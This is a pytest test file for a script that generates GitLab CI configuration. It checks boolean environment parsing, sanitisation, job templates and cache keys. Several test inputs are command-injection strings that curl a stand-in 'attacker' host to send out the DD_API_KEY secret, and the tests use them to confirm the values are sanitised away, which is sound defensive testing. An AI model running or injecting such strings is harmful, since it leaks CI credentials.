"""Tests for scripts/gen_gitlab_config.py."""

import importlib.util
import pathlib
import sys
import types
from unittest import mock

import pytest


_SCRIPT_PATH = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "gen_gitlab_config.py"


@pytest.fixture(scope="module")
def gen_gitlab_config_mod():
    # The script is not importable as-is: it runs under uv with its own dependencies, parses argv at
    # import time, and appends to sys.path. Stub ruamel.yaml, give it an empty argv, and restore
    # sys.path afterwards so the rest of the suite is unaffected.
    ruamel = types.ModuleType("ruamel")
    yaml = types.ModuleType("ruamel.yaml")

    class YAML:
        def load(self, content):
            return {"variables": {"TESTRUNNER_IMAGE": "testrunner:fake"}}

    yaml.YAML = YAML
    ruamel.yaml = yaml

    spec = importlib.util.spec_from_file_location("gen_gitlab_config", _SCRIPT_PATH)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    original_path = list(sys.path)
    with mock.patch.dict(sys.modules, {"ruamel": ruamel, "ruamel.yaml": yaml, spec.name: module}):
        with mock.patch.object(sys, "argv", [str(_SCRIPT_PATH)]):
            spec.loader.exec_module(module)
        try:
            yield module
        finally:
            sys.path[:] = original_path


@pytest.mark.parametrize(
    "value, expected",
    [
        (None, "false"),
        ("", "false"),
        ("false", "false"),
        ("true", "true"),
        ("TRUE", "true"),
        (" true", "false"),
        ("$(curl attacker/$DD_API_KEY)", "false"),
        ('true" && curl attacker/$DD_API_KEY #', "false"),
    ],
)
def test_get_bool_env_only_allows_literal_true(gen_gitlab_config_mod, monkeypatch, value, expected):
    monkeypatch.delenv("NIGHTLY_BUILD", raising=False)
    if value is not None:
        monkeypatch.setenv("NIGHTLY_BUILD", value)

    assert gen_gitlab_config_mod._get_bool_env("NIGHTLY_BUILD") == expected


def test_jobspec_sanitizes_nightly_build_before_script(gen_gitlab_config_mod, monkeypatch):
    monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")

    config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))

    assert '    - export NIGHTLY_BUILD="false"' in config
    assert "$(curl" not in config
    assert "$DD_API_KEY" not in config


def test_jobspec_uses_uv_test_template(gen_gitlab_config_mod):
    config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core", pip_cache_key="pip-key"))

    assert "  extends: .test_base_uv" in config
    assert "  UV_CACHE_DIR: ${CI_PROJECT_DIR}/.cache/uv" in config
    assert "  PIP_CACHE_KEY: pip-key" in config


def test_jobspec_waits_for_services_through_uv(gen_gitlab_config_mod):
    spec = gen_gitlab_config_mod.JobSpec(
        name="suite",
        stage="core",
        services=["redis"],
        python_versions={"3.12"},
    )
    config = str(spec)

    assert '          - PYTHON_VERSION: "3.9"' in config
    assert '          - PYTHON_VERSION: "3.12"' in config
    assert "    - ./scripts/run-uv-test-env wait -- redis" in config


def test_jobspec_retries_only_infrastructure_failures(gen_gitlab_config_mod):
    spec = gen_gitlab_config_mod.JobSpec(name="suite", stage="core", retry=2)

    config = str(spec)

    assert "  retry:\n    max: 2" in config
    assert "      - api_failure" in config
    assert "      - runner_system_failure" in config
    assert "      - stuck_or_timeout_failure" in config
    assert "script_failure" not in config


def test_build_base_venvs_template_gets_sanitized_bool_values(gen_gitlab_config_mod, monkeypatch, tmp_path):
    monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")
    monkeypatch.setenv("UNPIN_DEPENDENCIES", "$(curl attacker/$DD_API_KEY)")
    monkeypatch.setattr(gen_gitlab_config_mod, "TESTS_GEN", tmp_path / "tests-gen.yml")
    monkeypatch.setattr(gen_gitlab_config_mod, "_global_python_versions", {"3.11"})

    gen_gitlab_config_mod.gen_build_base_venvs()

    config = (tmp_path / "tests-gen.yml").read_text()
    assert "build_base_venvs:\n  # Keep the base producer independent" in config
    assert "  extends: .testrunner" in config
    assert "  extends: .cached_testrunner" not in config
    assert 'echo "NIGHTLY_BUILD: false"' in config
    assert 'echo "UNPIN_DEPENDENCIES: false"' in config
    assert 'if [[ "false" == "true" ]]' in config
    assert './scripts/build-uv-base "$PYTHON_VERSION"' in config
    assert "base_smoke_test_py3_11:" in config
    assert "    - ./scripts/run-uv-test-env --python 3.11 smoke_test" in config
    assert '          - PYTHON_VERSION: "3.11"' in config
    assert "$(curl" not in config
    assert "$DD_API_KEY" not in config


def test_collect_all_suite_venv_info_rejects_overlapping_suite_membership(gen_gitlab_config_mod):
    class FakeEnvironment:
        name = "tracer-uwsgi"
        id = "abc1234"
        python = "3.12"

        def matches(self, pattern):
            return pattern.search(self.name) is not None

    test_environments = types.SimpleNamespace(environments=lambda: [FakeEnvironment()])

    with mock.patch.dict(sys.modules, {"test_environments": test_environments}):
        with pytest.raises(ValueError, match="abc1234: tracer, tracer-uwsgi"):
            gen_gitlab_config_mod.collect_all_suite_venv_info(
                {
                    "tracer": "tracer",
                    "tracer-uwsgi": "tracer-uwsgi",
                }
            )


def test_requirements_cache_key_matches_sorted_lock_contents(gen_gitlab_config_mod, monkeypatch, tmp_path):
    import test_environments

    requirements = tmp_path / "locks"
    requirements.mkdir(parents=True)
    (requirements / "abc1234.txt").write_text("z-package==1\na-package==1\n")
    (requirements / "def5678.txt").write_text("m-package==1\n")
    monkeypatch.setattr(test_environments, "LOCK_ROOT", requirements)

    expected = gen_gitlab_config_mod.hashlib.sha256(b"a-package==1\nm-package==1\nz-package==1\n").hexdigest()

    assert gen_gitlab_config_mod.requirements_cache_key({"def5678", "abc1234"}) == expected
